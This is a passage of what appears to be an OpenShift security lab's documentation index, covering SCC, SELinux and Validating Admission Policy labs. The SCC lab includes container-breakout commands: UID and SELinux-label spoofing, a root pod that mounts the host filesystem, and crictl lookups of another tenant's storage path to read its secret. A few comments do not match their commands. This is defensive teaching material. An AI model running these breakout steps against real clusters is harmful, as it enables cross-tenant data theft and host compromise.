</ul>"},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/#2-mandatory-access-control-mac-via-selinux","title":"2. Mandatory Access Control (MAC) via SELinux","text":"<p>\"The System's Perspective\"</p> <p>This is an additional security layer enforced by the kernel, based on Labels (Contexts).</p> <ul> <li>Rule: \"Does a process with label <code>container_t:c1,c1</code> have permission to read a file labeled <code>container_file_t:c1,c1</code>?\"</li> <li>Strength: Even if a process runs as the correct UID, if the SELinux labels (MCS categories) don't match, the Kernel blocks access. This is the primary defense against container breakouts.</li> </ul>"},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/#3-openshift-security-context-constraints-scc","title":"3. OpenShift Security Context Constraints (SCC)","text":"<p>\"The Cluster's Perspective\"</p> <p>While DAC and MAC are the enforcement mechanisms in the Linux Kernel, SCC is the higher-level admission controller that configures them. It governs what a pod is allowed to request before it ever reaches a node.</p> <ul> <li> <p>Role: It authorizes (or denies) sensitive requests at the API level. This includes:</p> <ul> <li>Identity: Which UIDs and SELinux labels can be used?</li> <li>Capabilities: Can the pod request powerful Linux capabilities (e.g., <code>NET_ADMIN</code>, <code>SYS_TIME</code>)?</li> <li>Host Access: Can the pod mount host directories or use the host network?</li> </ul> </li> </ul>"},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/#4-the-demo-scenario","title":"4. The Demo Scenario","text":"<p>In this lab, we will simulate a multi-tenant breakout scenario on a shared node. We will attempt to access a sensitive \"Crown Jewels\" file owned by Tenant A (UID 1000, MCS <code>c1,c1</code>) using various attack vectors.</p> <p>We will prove that:</p> <ol> <li>MAC Wins: Matching UIDs (<code>1000</code>) is not enough if SELinux categories differ (Blocked by Kernel).</li> <li>DAC Wins: Matching SELinux categories (<code>c1,c1</code>) is not enough if UIDs differ (Blocked by Filesystem).</li> <li>SCC Wins: Spoofing access is impossible without a privileged Security Context Constraint (Blocked by SCC).</li> </ol>"},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/#phase-1-global-infrastructure-setup-admin","title":"Phase 1: Global Infrastructure Setup (Admin)","text":"<p>We establish the node, the projects, and the security context foundations.</p> <pre><code># 1. Prepare the Node and Shared Host Directory\n# This establishes the shared landing zone for the breakout simulation.\n# We choose the first worker node as our target.\noc label node compute-0 type=shared-compute --overwrite\n\nNODE_NAME=$(oc get nodes -l type=shared-compute -o jsonpath='{.items[0].metadata.name}')\n\noc debug node/$NODE_NAME -- chroot /host /bin/sh -c \\\n  \"mkdir -p /mnt/shared-data &amp;&amp; \\\n   chown 1000:1000 -R /mnt/shared-data &amp;&amp; \\\n   chmod 700 -R /mnt/shared-data &amp;&amp; \\\n   chcon -t container_file_t -l s0:c1,c1 /mnt/shared-data\"\n\n# 2. Setup Projects &amp; Special Permissions\noc new-project tenant-a\noc new-project tenant-b\noc create user user001 2&gt;/dev/null || true\noc adm policy add-role-to-user admin user001 -n tenant-a\noc adm policy add-role-to-user admin user001 -n tenant-b\n\n# 3. Create 'demo-sa' and grant SCCs\n# We use this SA to allow us to manually set UIDs and Labels for Pods A, B, C, and E.\nfor ns in tenant-a tenant-b; do\n  oc create sa demo-sa -n $ns\n  oc adm policy add-scc-to-user hostmount-anyuid-v2 -z demo-sa -n $ns\ndone\n</code></pre>"},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/#phase-2-pod-a-the-victim-namespace-tenant-a","title":"Phase 2: Pod A \u2014 The Victim (Namespace: tenant-a)","text":"<p>Goal: Deploy the \"Crown Jewels\" file to the host with a specific SELinux category.</p> <pre><code>cat &lt;&lt;EOF | oc apply --as=user001 -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-a\n  namespace: tenant-a\nspec:\n  nodeSelector:\n    type: shared-compute\n  serviceAccountName: demo-sa\n  securityContext:\n    runAsUser: 1000\n    seLinuxOptions:\n      level: \"s0:c1,c1\"\n  containers:\n  - name: main\n    image: registry.access.redhat.com/ubi9/ubi\n    command: [\"sh\", \"-c\", \"echo 'TENANT-A-SECRET' &gt; /data/secret.txt; sleep infinity\"]\n    volumeMounts:\n    - name: vol\n      mountPath: /data\n  volumes:\n  - name: vol\n    hostPath:\n      path: /mnt/shared-data\nEOF\n</code></pre> <p>Step-by-Step Verification for Pod A:</p> <pre><code># Verify the Pod is running as UID 1000\noc exec pod-a --as=user001 -n tenant-a -- id\n\n# Verify the file exists on the host path and has the correct SELinux category\noc exec pod-a --as=user001 -n tenant-a -- ls -lZ /data/secret.txt\n</code></pre> <p>Explanation: Pod A is the owner. It has successfully written a file owned by UID 1000 with the SELinux label <code>s0:c1,c1</code>.</p>"},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/#phase-3-pod-b-the-blocked-breakout-namespace-tenant-b","title":"Phase 3: Pod B \u2014 The Blocked Breakout (Namespace: tenant-b)","text":"<p>Goal: Show that UID collision (1000 vs 1000) is defeated by SELinux categories.</p> <pre><code>cat &lt;&lt;EOF | oc apply --as=user001 -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-b\n  namespace: tenant-b\nspec:\n  nodeSelector:\n    type: shared-compute\n  serviceAccountName: demo-sa\n  securityContext:\n    runAsUser: 1000\n    seLinuxOptions:\n      level: \"s0:c2,c2\"\n  containers:\n  - name: main\n    image: registry.access.redhat.com/ubi9/ubi\n    command: [\"sh\", \"-c\", \"sleep infinity\"]\n    volumeMounts:\n    - name: vol\n      mountPath: /data\n  volumes:\n  - name: vol\n    hostPath:\n      path: /mnt/shared-data\nEOF\n</code></pre> <p>Step-by-Step Verification for Pod B:</p> <pre><code># Confirm Pod B is also UID 1000 (Collision)\noc exec pod-b --as=user001 -n tenant-b -- id\n\n# Attempt to read the victim's data\noc exec pod-b --as=user001 -n tenant-b -- cat /data/secret.txt\n</code></pre> <p>Explanation: PERMISSION DENIED. Despite being the same user (UID 1000) on the same host path, the kernel prevents the read because the MCS labels do not match (MAC Failure). Category <code>c2,c2</code> is not authorized to read <code>c1,c1</code>.</p>"},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/#phase-4-pod-e-dac-block-namespace-tenant-b","title":"Phase 4: Pod E \u2014 DAC Block (Namespace: tenant-b)","text":"<p>Goal: Demonstrate that even if SELinux labels match, standard Linux DAC still applies.</p> <pre><code>cat &lt;&lt;EOF | oc apply --as=user001 -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-e\n  namespace: tenant-b\nspec:\n  nodeSelector:\n    type: shared-compute\n  serviceAccountName: demo-sa\n  securityContext:\n    runAsUser: 2000\n    seLinuxOptions:\n      level: \"s0:c1,c1\"\n  containers:\n  - name: main\n    image: registry.access.redhat.com/ubi9/ubi\n    command: [\"sh\", \"-c\", \"sleep infinity\"]\n    volumeMounts:\n    - name: vol\n      mountPath: /data\n  volumes:\n  - name: vol\n    hostPath:\n      path: /mnt/shared-data\nEOF\n</code></pre> <p>Step-by-Step Verification for Pod E:</p> <pre><code># Attempt to read the victim's data with matching labels but different UID\noc exec pod-e --as=user001 -n tenant-b -- id\noc exec pod-e --as=user001 -n tenant-b -- ls -la /data/\noc exec pod-e --as=user001 -n tenant-b -- cat /data/secret.txt\n</code></pre> <p>Explanation: PERMISSION DENIED. SELinux allowed the access (labels match), but standard Linux permissions blocked it because UID 2000 does not own the directory or the file (DAC Failure). This shows that UID isolation is still a critical secondary layer.</p>"},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/#phase-5-pod-c-the-privileged-thief-namespace-tenant-b","title":"Phase 5: Pod C \u2014 The Privileged Thief (Namespace: tenant-b)","text":"<p>Goal: Demonstrate that theft only occurs if a user is allowed to spoof BOTH the UID and the SELinux label.</p> <pre><code>cat &lt;&lt;EOF | oc apply --as=user001 -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-c\n  namespace: tenant-b\nspec:\n  nodeSelector:\n    type: shared-compute\n  serviceAccountName: demo-sa\n  securityContext:\n    runAsUser: 1000\n    seLinuxOptions:\n      level: \"s0:c1,c1\"\n  containers:\n  - name: main\n    image: registry.access.redhat.com/ubi9/ubi\n    command: [\"sh\", \"-c\", \"sleep infinity\"]\n    volumeMounts:\n    - name: vol\n      mountPath: /data\n  volumes:\n  - name: vol\n    hostPath:\n      path: /mnt/shared-data\nEOF\n</code></pre> <p>Step-by-Step Verification for Pod C:</p> <pre><code># Attempt to read the victim's data with matching labels\noc exec pod-c --as=user001 -n tenant-b -- id\noc exec pod-c --as=user001 -n tenant-b -- cat /data/secret.txt\n</code></pre> <p>Explanation: ACCESS GRANTED. Pod C can read the data because it was explicitly allowed (via a custom SCC set to <code>RunAsAny</code>) to assume the <code>c1,c1</code> identity. This proves SELinux is the only real barrier if UIDs are compromised.</p>"},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/#phase-6-the-spoofing-wall-admission-failure-namespace-tenant-b","title":"Phase 6: The Spoofing Wall \u2014 Admission Failure (Namespace: tenant-b)","text":"<p>Goal: Show that standard SCCs (restricted and anyuid) block identity theft at the API level.</p> <pre><code># 1. Attempt using a restricted SCC\ncat &lt;&lt;EOF | oc apply --as=user001 -n tenant-b -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-d\nspec:\n  nodeSelector:\n    type: shared-compute\n  securityContext:\n    runAsUser: 1000\n    seLinuxOptions:\n      level: \"s0:c1,c1\"\n  containers:\n  - name: main\n    image: registry.access.redhat.com/ubi9/ubi\n    command: [\"sh\", \"-c\", \"sleep infinity\"]\nEOF\n\n# 2. Attempt using standard 'anyuid' SCC (which is MustRunAs on this cluster)\noc create sa anyuid-sa -n tenant-b\noc adm policy add-scc-to-user anyuid -z anyuid-sa -n tenant-b\n\ncat &lt;&lt;EOF | oc apply --as=user001 -n tenant-b -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-f\nspec:\n  nodeSelector:\n    type: shared-compute\n  serviceAccountName: anyuid-sa\n  securityContext:\n    runAsUser: 1000\n    seLinuxOptions:\n      level: \"s0:c1,c1\"\n  containers:\n  - name: main\n    image: registry.access.redhat.com/ubi9/ubi\n    command: [\"sh\", \"-c\", \"sleep infinity\"]\nEOF\n</code></pre> <p>Explanation: REJECTED. The Admission Controller sees the user trying to \"lie\" about their SELinux level and blocks the pod before the kernel even sees it. This applies to both the default <code>restricted</code> SCC and the <code>anyuid</code> SCC (which often defaults to <code>MustRunAs</code> for SELinux).</p>"},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/#phase-7-the-root-myth-root-user-vs-selinux-policy","title":"Phase 7: The \"Root\" Myth \u2014 Root User vs. SELinux Policy","text":"<p>Goal: Demonstrate that running as Root (UID 0) inside a container does NOT grant valid Root permissions on the host filesystem if SELinux is enforcing.</p> <pre><code>cat &lt;&lt;EOF | oc apply --as=user001 -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: pod-root-fail\n  namespace: tenant-b\nspec:\n  nodeSelector:\n    type: shared-compute\n  serviceAccountName: demo-sa\n  securityContext:\n    runAsUser: 0\n  containers:\n  - name: main\n    image: registry.access.redhat.com/ubi9/ubi\n    command: [\"sh\", \"-c\", \"sleep infinity\"]\n    volumeMounts:\n    - name: host-root\n      mountPath: /host\n  volumes:\n  - name: host-root\n    hostPath:\n      path: /\nEOF\n</code></pre> <p>In this final phase, we act as an attacker who has successfully deployed a Pod as Root (UID 0) with the entire Host Filesystem mounted at <code>/host</code>. We will now attempt to leverage this position to compromise the node by modifying system files and stealing data from other tenants.</p> <pre><code># 1. Verify we are UID 0 (Root)\noc exec pod-root-fail --as=user001 -n tenant-b -- id\n# Output: uid=0(root) gid=0(root) groups=0(root)\n\n# 2. Verify we see the Host Filesystem\noc exec pod-root-fail --as=user001 -n tenant-b -- ls -la /host/root/\n\n# 3. Attempt to exploit: Write a file to the host's /etc directory\noc exec pod-root-fail --as=user001 -n tenant-b -- touch /host/tmp/hacked\n\n# 4. Attempted Confidentiality Breach: THE DYNAMIC HEIST\n# -------------------------------------------------------------------------\n# A. Create a \"Hidden\" file inside Pod-A (Tenant-A)\noc exec pod-a -n tenant-a -- sh -c \"echo 'password' &gt; /tmp/tenant-a-secret.txt\"\n\n# B. DYNAMIC DISCOVERY: Find the physical 'diff' path of Pod-A from Tenant-B\n# We talk to the CRI socket (mounted in our pod) to find the victim's disk location.\n# We first identify the node where the lab is running.\nNODE_NAME=$(oc get nodes -l type=shared-compute -o jsonpath='{.items[0].metadata.name}')\n\nVICTIM_DIFF=$(oc debug node/$NODE_NAME -q -- chroot /host /bin/sh -c \"crictl inspect \\$(crictl ps --label io.kubernetes.pod.name=pod-a -q)\" 2&gt;/dev/null | grep -oP '/var/lib/containers/storage/overlay/[a-z0-9]+/merged' | head -n 1 | sed 's/merged/diff/')\n\n# We check the file from the NODE (Admin Access - Should Work)\noc debug node/$NODE_NAME -q -- cat /host/${VICTIM_DIFF}/tmp/tenant-a-secret.txt 2&gt;/dev/null \n\n# C. THE EXTRACTION: Read the file from the Host Root mount (Tenant Access - Should Fail)\noc exec pod-root-fail --as=user001 -n tenant-b -- cat /host${VICTIM_DIFF}/tmp/tenant-a-secret.txt\n</code></pre> <p>Explanation: PERMISSION DENIED (FULL PROTECTION).</p> <ul> <li>Host Admin (Successful): The <code>oc debug node</code> command (Step B) succeeded because it runs as a Privileged container, which disables SELinux.</li> <li>Malicious Tenant (Blocked): The <code>pod-root-fail</code> (Step C) FAILED to read the secret. Even though it is UID 0 and has <code>hostPath</code> access, the SELinux label <code>container_t</code> is blocked from reading the <code>container_var_lib_t</code> storage layer.</li> </ul> <p>Conclusion: SELinux successfully neutralizes the \"Root\" user. Even with <code>hostPath</code> and <code>runAsUser: 0</code>, the attacker cannot compromise the host OS vs other tenants.</p>"},{"location":"admissioncontrols/scc/SCC-LayersOfContainerSecurity/#conclusion-why-sccs-are-powerful","title":"Conclusion: Why SCCs are Powerful","text":"<p>SCCs are the Platform Trust Boundary that turns Kubernetes into a secure, multi-tenant platform.</p> <ol> <li>Prevention of Identity Spoofing: Unlike standard Kubernetes, SCCs prevent a pod from \"impersonating\" another tenant by validating every UID and SELinux label request.</li> <li>The Two-Key Lock: OpenShift security relies on a two-key lock. The SCC prevents identity spoofing at the API level (Governance), and SELinux prevents data access at the Kernel level (Enforcement).</li> <li>The Default Win: By using Restricted SCCs, OpenShift ensures that even if a container is compromised, it cannot assume the identity needed to bypass the Kernel-level MAC barriers.</li> </ol>"},{"location":"admissioncontrols/scc/custom/","title":"Lab: Implementing Least Privilege Governance with Custom SCCs","text":""},{"location":"admissioncontrols/scc/custom/#introduction-the-golden-path-strategy","title":"Introduction: The \"Golden Path\" Strategy","text":"<p>In a regulated environment, you often need more control than the default <code>restricted-v2</code> SCC provides. You might need to ensure that specific workloads only run as a predefined User ID (UID) or within a specific SELinux compartment, regardless of what the developer requests.</p> <p>This lab demonstrates how to create a Custom Security Context Constraint (SCC) that acts as a strict governance policy. We will implement a \"Bucket\" strategy where we force a workload to adopt a specific identity (<code>UID 1000</code> and <code>s0:c500,c600</code>), proving that the Platform Admin holds the ultimate authority over runtime identity.</p>"},{"location":"admissioncontrols/scc/custom/#phase-1-environment-setup","title":"Phase 1: Environment Setup","text":"<p>We establish a clean project and a restricted ServiceAccount to act as our tenant.</p> <pre><code># 1. Create the tenant project\noc new-project scc-governance-lab\n\n# 2. Create the ServiceAccount\noc create sa governed-sa -n scc-governance-lab\n\n# 3. Create a restricted user context for testing\noc create user user001 2&gt;/dev/null || true\noc adm policy add-role-to-user admin user001 -n scc-governance-lab\n</code></pre>"},{"location":"admissioncontrols/scc/custom/#phase-2-create-the-custom-bucket-scc","title":"Phase 2: Create the Custom \"Bucket\" SCC","text":"<p>We will build an SCC based on the <code>restricted-v2</code> profile. It allows the pod to run as UID 1000, but it forces the SELinux identity into a specific \"Bucket\" (c500,c600).</p> <p>Technical Note: In OpenShift SCCs, the <code>MustRunAs</code> strategy for SELinux acts as a validator. It requires that the Pod's request matches the SCC's level exactly.</p> <pre><code>cat &lt;&lt;EOF | oc apply -f -\napiVersion: security.openshift.io/v1\nkind: SecurityContextConstraints\nmetadata:\n  name: scc-enforced-governance\nallowPrivilegedContainer: false\nallowPrivilegeEscalation: false\nrequiredDropCapabilities: [\"ALL\"]\nrunAsUser:\n  type: MustRunAsRange\n  uidRangeMin: 1000\n  uidRangeMax: 1000\nseLinuxContext:\n  type: MustRunAs           # &lt;--- THE ENFORCER: Forces a specific label\n  seLinuxOptions:\n    level: \"s0:c500,c600\"    # &lt;--- THE BUCKET: The only allowed identity\nvolumes: [\"configMap\", \"downwardAPI\", \"emptyDir\", \"secret\"]\nEOF\n\n# Grant the SCC to the tenant\noc adm policy add-scc-to-user scc-enforced-governance -z governed-sa -n scc-governance-lab\n</code></pre>"},{"location":"admissioncontrols/scc/custom/#phase-3-the-success-case-explicit-compliance","title":"Phase 3: The \"Success\" Case (Explicit Compliance)","text":"<p>The developer requests the exact identity allowed by their governance policy. This shows the \"Least Privilege\" model in a functional state.</p> <pre><code>cat &lt;&lt;EOF | oc apply --as=user001 -n scc-governance-lab -f -\napiVersion: v1\nkind: Pod\nmetadata: { name: pod-compliant }\nspec:\n  serviceAccountName: governed-sa\n  securityContext:\n    runAsUser: 1000\n    seLinuxOptions: { level: \"s0:c500,c600\" } # Matches the SCC\n  containers:\n  - name: main\n    image: registry.access.redhat.com/ubi9/ubi\n    command: [\"sh\", \"-c\", \"sleep infinity\"]\nEOF\n</code></pre> <p>Verification:</p> <pre><code>oc get pod pod-compliant -n scc-governance-lab -o jsonpath='{.spec.securityContext.seLinuxOptions.level}'\n# Result: s0:c500,c600 (Validated and Admitted)\n</code></pre>"},{"location":"admissioncontrols/scc/custom/#phase-4-the-auto-pilot-success-implicit-compliance","title":"Phase 4: The \"Auto-Pilot\" Success (Implicit Compliance)","text":"<p>Here we prove that the developer doesn't even need to know the security requirements. Because the SCC forces the identity, the Admission Controller automates the security context injection.</p> <pre><code>cat &lt;&lt;EOF | oc apply --as=user001 -n scc-governance-lab -f -\napiVersion: v1\nkind: Pod\nmetadata: { name: pod-autopilot }\nspec:\n  serviceAccountName: governed-sa\n  containers:\n  - name: main\n    image: registry.access.redhat.com/ubi9/ubi\n    command: [\"sh\", \"-c\", \"sleep infinity\"]\nEOF\n</code></pre> <p>Verification:</p> <pre><code># Check that the SCC automatically injected the correct \"Bucket\" label\noc get pod pod-autopilot -n scc-governance-lab -o jsonpath='{.spec.securityContext.seLinuxOptions.level}'\n# Result: s0:c500,c600 (Automatically Injected!)\n</code></pre>"},{"location":"admissioncontrols/scc/custom/#phase-5-the-attack-case-spoofing-attempt","title":"Phase 5: The \"Attack\" Case (Spoofing Attempt)","text":"<p>An attacker tries to \"impersonate\" a victim in another namespace by requesting the level s0:c1,c1. Because our SCC is set to <code>MustRunAs</code>, the Admission Controller kills the request.</p> <pre><code>cat &lt;&lt;EOF | oc apply --as=user001 -n scc-governance-lab -f -\napiVersion: v1\nkind: Pod\nmetadata: { name: pod-bypass-attempt }\nspec:\n  serviceAccountName: governed-sa\n  securityContext:\n    runAsUser: 1000\n    seLinuxOptions: { level: \"s0:c1,c1\" } # THE SPOOF: Not in the bucket\n  containers:\n  - name: main\n    image: registry.access.redhat.com/ubi9/ubi\n    command: [\"sh\", \"-c\", \"sleep infinity\"]\nEOF\n</code></pre> <p>Verification: Observe the terminal error.</p> <p>Result: <code>Forbidden</code>. The error message will explicitly state: <code>Invalid value: \"s0:c1,c1\": must be s0:c500,c600</code>.</p>"},{"location":"admissioncontrols/scc/custom/#summary-table-dac-vs-mac-vs-scc","title":"Summary Table: DAC vs. MAC vs. SCC","text":"Security Layer Role in this Lab Failure Mode (Pod C) Success Mode (This Lab) SCC (API) Governance <code>RunAsAny</code> allows spoofing. <code>MustRunAs</code> blocks spoofing. UID (DAC) Filesystem UID overlap permits entry. UID range prevents root. MCS (MAC) Kernel Matching labels permit read. Unique labels block read."},{"location":"admissioncontrols/scc/custom/#conclusion-the-power-of-custom-sccs","title":"Conclusion: The Power of Custom SCCs","text":"<p>By tailoring an SCC to the specific needs of a workload, you move away from \"God Mode\" configurations (<code>privileged</code>, <code>anyuid</code>) and into \"Enforced Multi-tenancy.\"</p> <ol> <li>Identity Control: The SCC acts as the \"First Lock,\" ensuring a Pod cannot even claim to be someone else.</li> <li>Zero Inference: We don't guess what the user needs; we define a bucket and force them to stay inside it.</li> <li>The Result: Even if an attacker finds a way to overlap a UID, they are trapped by an SELinux label they are physically incapable of changing.</li> </ol>"},{"location":"admissioncontrols/vap/","title":"Validating Admission Policy (VAP)","text":"<p>Validating Admission Policy offers a declarative, in-process alternative to validating admission webhooks. It uses the Common Expression Language (CEL) to declare the validation rules of a policy.</p>"},{"location":"admissioncontrols/vap/#key-concepts","title":"Key Concepts","text":"<p>A policy is generally made up of three resources:</p> <ol> <li>ValidatingAdmissionPolicy: Describes the abstract logic of a policy (e.g., \"this policy makes sure a particular label is set\").</li> <li>ValidatingAdmissionPolicyBinding: Links the policy to specific resources or scopes (e.g., \"apply this policy to all Pods in the <code>test</code> namespace\").</li> <li>Parameter Resource (Optional): Provides configuration to the policy (e.g., \"max replicas = 3\"). This can be a native type (ConfigMap) or a CRD.</li> </ol>"},{"location":"admissioncontrols/vap/#how-it-works","title":"How it Works","text":"<p>VAP uses CEL expressions to validate requests. *   <code>object</code>: The object from the incoming request. *   <code>oldObject</code>: The existing object (null for CREATE). *   <code>request</code>: Attributes of the admission request. *   <code>params</code>: The parameter resource (if used).</p>"},{"location":"admissioncontrols/vap/#validation-actions","title":"Validation Actions","text":"<p>Each binding must specify one or more <code>validationActions</code>: *   Deny: Validation failure results in a denied request. *   Warn: Validation failure is reported to the client as a warning. *   Audit: Validation failure is included in the audit event.</p>"},{"location":"admissioncontrols/vap/#examples","title":"Examples","text":""},{"location":"admissioncontrols/vap/#1-basic-policy-no-parameters","title":"1. Basic Policy (No Parameters)","text":"<p>Ensures that deployments have 5 or fewer replicas.</p> <pre><code>apiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingAdmissionPolicy\nmetadata:\n  name: \"demo-policy.example.com\"\nspec:\n  failurePolicy: Fail\n  matchConstraints:\n    resourceRules:\n    - apiGroups:   [\"apps\"]\n      apiVersions: [\"v1\"]\n      operations:  [\"CREATE\", \"UPDATE\"]\n      resources:   [\"deployments\"]\n  validations:\n    - expression: \"object.spec.replicas &lt;= 5\"\n</code></pre> <p>Binding:</p> <pre><code>apiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingAdmissionPolicyBinding\nmetadata:\n  name: \"demo-binding-test.example.com\"\nspec:\n  policyName: \"demo-policy.example.com\"\n  validationActions: [Deny]\n  matchResources:\n    namespaceSelector:\n      matchLabels:\n        environment: test\n</code></pre>"},{"location":"admissioncontrols/vap/#2-policy-with-parameters","title":"2. Policy with Parameters","text":"<p>Allows configuring the max replicas via a separate resource.</p> <p>Policy:</p> <pre><code>apiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingAdmissionPolicy\nmetadata:\n  name: \"replicalimit-policy.example.com\"\nspec:\n  paramKind:\n    apiVersion: rules.example.com/v1\n    kind: ReplicaLimit\n  validations:\n    - expression: \"object.spec.replicas &lt;= params.maxReplicas\"\n      reason: Invalid\n</code></pre>"},{"location":"admissioncontrols/vap/#3-scenario-opt-in-restriction","title":"3. Scenario: Opt-In Restriction","text":"<p>This policy prevents workloads from setting <code>nodeSelector</code> or <code>tolerations</code>, but only for namespaces that are explicitly tagged as \"restricted\". This allows you to apply stricter controls to specific environments (like production) while leaving dev environments flexible.</p> <p>The Strategy:</p> <ol> <li> <p>The Policy (Rules): \"Deny if <code>nodeSelector</code> or <code>tolerations</code> are present.\"</p> </li> <li> <p>The Binding (Scope): \"Apply ONLY to namespaces with the label <code>env=restricted</code>.\"</p> </li> </ol> <p>Policy Definition:</p> <pre><code>apiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingAdmissionPolicy\nmetadata:\n  name: \"block-custom-scheduling\"\nspec:\n  failurePolicy: Fail\n  matchConstraints:\n    resourceRules:\n      - apiGroups: [\"\"]\n        apiVersions: [\"v1\"]\n        operations: [\"CREATE\", \"UPDATE\"]\n        resources: [\"pods\"]\n      - apiGroups: [\"apps\"]\n        apiVersions: [\"v1\"]\n        operations: [\"CREATE\", \"UPDATE\"]\n        resources: [\"deployments\", \"statefulsets\", \"daemonsets\"]\n  validations:\n    - expression: |\n        object.kind == 'Pod' ? \n        (!has(object.spec.nodeSelector) &amp;&amp; !has(object.spec.tolerations)) : \n        (!has(object.spec.template.spec.nodeSelector) &amp;&amp; !has(object.spec.template.spec.tolerations))\n      message: \"Custom scheduling (nodeSelector, tolerations) is forbidden in 'restricted' environments.\"\n</code></pre> <p>Binding (The Inclusion Logic):</p> <pre><code>apiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingAdmissionPolicyBinding\nmetadata:\n  name: \"block-custom-scheduling-binding\"\nspec:\n  policyName: \"block-custom-scheduling\"\n  validationActions: [Deny]\n  matchResources:\n    # Logic: Apply ONLY to namespaces with this specific label\n    namespaceSelector:\n      matchLabels:\n        env: restricted\n</code></pre>"},{"location":"admissioncontrols/vap/#advanced-features","title":"Advanced Features","text":"<ul> <li>Match Conditions: Fine-grained filtering using CEL (e.g., exclude specific users or groups).</li> <li>Audit Annotations: Include custom annotations in audit events based on CEL expressions.</li> <li>Message Expressions: Dynamic error messages (e.g., \"replicas must be &lt;= 3\").</li> <li>Variables: Extract complex logic into reusable variables within the policy.</li> </ul>"},{"location":"admissioncontrols/vap/vap-demo/","title":"Validating Admission  Demo","text":"<p>VAP Demo \u2013 Step by step</p> <ul> <li>Goal: Demonstrate how the VAP (Validating Admission Policies) created under <code>iam/vap/manifests/</code> enforce the same checks as the <code>compliance</code> CustomRules. Use example namespaces that describe real use-cases.</li> </ul> <p>Prerequisites: - A cluster with <code>kubectl</code> configured and <code>kustomize</code> available locally (or use <code>kubectl apply -k</code>). - The VAP controller that supports <code>ValidatingAdmissionPolicy</code>/<code>ValidatingAdmissionPolicyBinding</code> is installed and the cluster admits these resources.</p> <p>Namespaces (example use-cases): - <code>platform-ops</code> \u2014 platform/system workloads (allowed wide privileges in approved list). - <code>finance-app</code> \u2014 production-ish app namespace where registries and network policies must be enforced. - <code>dev-team</code> \u2014 developer/test namespace, can be labeled to enforce policies for demos.</p> <p>1) Create example namespaces</p> <p>Apply these namespace manifests (or create them inline):</p> <p>For the demo we create example Namespaces that relax the cluster PodSecurity admission to <code>privileged</code> so tests that need <code>hostPath</code> or privileged containers can run.</p> <p>The example manifests are in <code>iam/vap/examples/</code>. Apply them with:</p> <pre><code>kubectl apply -f iam/vap/examples/\n</code></pre> <p>Note: these <code>pod-security.kubernetes.io/*</code> labels increase risk and are for demo/test only. Remove or set back to <code>restricted</code> after testing.</p> <p>2) Deploy the VAP manifests</p> <p>From the repo root run:</p> <pre><code>kubectl apply -k iam/vap/manifests/\n</code></pre> <p>This applies all <code>ValidatingAdmissionPolicy</code> and <code>ValidatingAdmissionPolicyBinding</code> resources created earlier.</p> <p>3) Test image registry enforcement (image-supply-chain)</p> <ul> <li>Good: image from <code>quay.io</code></li> </ul> <pre><code>cat &lt;&lt;EOF | kubectl -n finance-app apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: good-registry\nspec:\n  securityContext:\n    runAsNonRoot: true\n  containers:\n  - name: httpd\n    image: registry.redhat.io/ubi8/httpd-24\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop: [\"ALL\"]\n      runAsNonRoot: true\n      seccompProfile:\n        type: RuntimeDefault\nEOF\n</code></pre> <p>Expected: Pod is created successfully.</p> <ul> <li>Bad: image from <code>docker.io</code> (should be denied)</li> </ul> <pre><code>cat &lt;&lt;EOF | kubectl -n finance-app apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: bad-registry\nspec:\n  securityContext:\n    runAsNonRoot: true\n  containers:\n  - name: nginx\n    image: nginx:latest\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop: [\"ALL\"]\n      runAsNonRoot: true\n      seccompProfile:\n        type: RuntimeDefault\nEOF\n</code></pre> <p>Expected: Admission is denied with message about approved registries.</p> <p>4) Test disallowing shadow databases</p> <ul> <li>Good: Deploy DB in <code>finance-app</code> (namespace labeled <code>custom.security/database=true</code>):</li> </ul> <pre><code>cat &lt;&lt;EOF | kubectl -n finance-app apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: allowed-db\nspec:\n  securityContext:\n    runAsNonRoot: true\n  containers:\n  - name: postgres\n    image: quay.io/hummingbird/postgresql:latest\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop: [\"ALL\"]\n      runAsNonRoot: true\n      seccompProfile:\n        type: RuntimeDefault\nEOF\n</code></pre> <p>Expected: Allowed in <code>finance-app</code> because it's labeled for DBs.</p> <ul> <li>Bad: Deploy DB in <code>dev-team</code> (should be denied):</li> </ul> <pre><code>cat &lt;&lt;EOF | kubectl -n dev-team apply -f -\napiVersion: v1\nkind: Pod\nmetadata:\n  name: shadow-db\nspec:\n  securityContext:\n    runAsNonRoot: true\n  containers:\n  - name: postgres\n    image: quay.io/hummingbird/postgresql:latest\n    securityContext:\n      allowPrivilegeEscalation: false\n      capabilities:\n        drop: [\"ALL\"]\n      runAsNonRoot: true\n      seccompProfile:\n        type: RuntimeDefault\nEOF\n</code></pre> <p>Expected: Denied with message about unapproved database images.</p> <p>5) Test NetworkPolicy \u2014 <code>block-risky-netpol</code> only</p> <p>We focus this demo on the <code>block-risky-netpol</code> policy which rejects NetworkPolicies that effectively allow all traffic to all pods via either an empty rule (<code>{}</code>) or an ipBlock of <code>0.0.0.0/0</code>.</p> <p>Apply the network-policy 